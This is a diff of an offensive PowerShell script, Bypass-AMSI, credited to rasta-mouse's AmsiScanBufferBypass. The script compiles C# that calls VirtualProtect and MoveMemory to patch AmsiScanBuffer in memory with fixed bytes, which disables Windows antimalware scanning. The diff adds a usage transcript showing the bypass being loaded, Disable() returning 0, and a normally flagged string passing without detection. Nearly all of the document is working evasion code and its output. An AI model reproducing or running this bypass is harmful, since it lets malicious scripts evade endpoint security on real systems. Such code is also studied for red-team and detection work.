@@ -30,7 +30,6 @@ function Bypass-AMSI
 ######################################################################################################################################
 [**] update 08/01/2019 from rasta-mouse's AmsiScanBufferBypass project (https://rastamouse.me/2018/12/amsiscanbuffer-bypass-part-4/):
 ######################################################################################################################################
-
 $Ref = (
 "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
 "System.Runtime.InteropServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
@@ -67,7 +66,7 @@ namespace Bypass
 
             if (!VirtualProtect(ASBPtr, dwSize, 0x40, out Zero)) { return 1; }
 
-            Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; # <---- changes here
+            Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
             IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
             Marshal.Copy(Patch, 0, unmanagedPointer, 6);
             MoveMemory(ASBPtr, unmanagedPointer, 6);
@@ -79,3 +78,13 @@ namespace Bypass
 "@
 
 Add-Type -ReferencedAssemblies $Ref -TypeDefinition $Source -Language CSharp
+
+[+] Usage:
+PS C:\Users\jmbourbon\Desktop\R&D> . .\amsi-bypass.ps1
+PS C:\Users\jmbourbon\Desktop\R&D> [Bypass.AMSI]::Disable()
+0
+
+PS C:\Users\jmbourbon\Desktop\R&D> "AmsiScanBuffer"
+AmsiScanBuffer 
+
+
